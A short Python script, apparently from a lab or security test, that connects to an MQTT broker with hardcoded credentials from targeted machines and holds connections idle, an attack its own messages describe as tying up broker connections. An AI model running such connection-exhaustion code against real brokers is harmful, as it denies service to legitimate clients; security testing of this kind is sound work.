import mqtt_utilities as util
import paho.mqtt.client as mqtt
import time

username = "client1"
password = "pass1"
local_ip_address = util.get_local_ip()
targeted_ip_addresses = ["10.0.0.7"]
reconnect_delay = 10
connection = util.Connection_status()

if local_ip_address in targeted_ip_addresses:
    while True:
        client = mqtt.Client(
            mqtt.CallbackAPIVersion.VERSION2, userdata=connection, protocol=mqtt.MQTTv5)
        client.username_pw_set(username, password)
        client.on_connect = util.on_connect
        client.on_disconnect = util.on_disconnect
        client.on_publish = util.on_publish
        if util.connect_client(client, connection, reconnect_delay):
            while connection.connected:
                time.sleep(30)
                print("Occupying empty connection...")
        else:
            print(
                f"Retrying connection in {reconnect_delay} seconds...", flush=True)
            time.sleep(reconnect_delay)
else:
    print("This machine wasn't targeted in the attack")